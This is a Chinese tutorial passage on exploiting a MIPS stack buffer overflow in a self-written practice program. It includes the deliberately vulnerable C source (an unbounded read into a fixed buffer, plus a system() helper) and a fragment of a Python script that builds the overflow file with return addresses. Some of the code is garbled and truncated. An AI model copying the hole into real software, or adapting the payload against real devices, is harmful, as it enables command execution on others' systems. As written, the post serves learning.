# MIPS缓冲区溢出漏洞实践
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
这份实践来自于学习-解密路由器漏洞的笔记和总结。主要用来回顾和巩固整个过程，整个过程里面不是非常顺利，主要的问题点在于对于溢出函数的地址的确定。  
这个自己写的漏洞代码主要基于MIPS的编译器进行编译，通过这份基础的溢出漏洞学习，主要用来为之后在路由器的漏洞溢出实践中打好基础。  
下面开始review整个过程。
## 1\. 首先我们来看看自己写的一个存在溢出漏洞的源代码
    #include 
    #include 
    #include 
    void do_system(int code,char *cmd)
    {
        char buf[255];
        //sleep(1);
        system(cmd);
    }
    void main()
    {
        char buf[256]={0};
        char ch;
        int count = 0;
        unsigned int fileLen = 0;
        struct stat fileData;
        FILE *fp;
        if(0 == stat("passwd",&fileData))
            fileLen = fileData.st_size;
        else
            return 1;
        if((fp = fopen("passwd","rb")) == NULL)
        {
            printf("Cannot open file passwd!n");
            exit(1);
        }    
        ch=fgetc(fp);
        while(count L",0x00402050)     # "x00x40x1FxA0"(PC)
    shellcode += "A"*24                # padding before command
    shellcode += cmd                # command($a1)
    shellcode += "B"*(0x3C - len(cmd))        # padding 
    shellcode += struct.pack(">L",0x00400420)     # "x00x40x05x90"
    shellcode += "BBBB"                # padding
    print ' ok!'
    #create password file
    print '[+] create password file',
    fw = open('passwd','w')
    fw.write(shellcode)#'A'*300+'x00'*10+'BBBB')
    fw.close()
    print ' ok!'
## 9\. 构造了之后，可以直接用下面的方式进行执行
可以发现成功的进行了漏洞的利用，
到这里，MIPS程序的基础的漏洞利用测试就完成了。
## 总结
这个程序里面有一个内部的do_system_0函数，并且不安全的输入源是输入文件passwd可以用来构造溢出漏洞文件。在之后的程序利用中，很可能主功能的程序里面并没有一个可以利用的函数让我们进行函数的溢出漏洞利用，需要进行shellcode的设计，即从系统库函数里面找到system函数，并且调用与执行。后者的问题稍微麻烦些。  
且，当前的这个函数do_system_0里面，对于输入字符串的读取，并不是一个字符串方式的提取，因此，如果是字符串的提取，会对于一些字节进行截取：0x00，如果指令里面存在这样的字符串，可能会导致注入程序的字符串被截断，从而导致程序漏洞利用失败。为此，需要进行shellcode编码或者用其他指令代替或者多跳转几次ROP
chain从而将bad byte消除。
下一次将继续分享总结，如何进行shellcode的编码以绕过字符串截断的问题。
审核人：yiwang 编辑：边边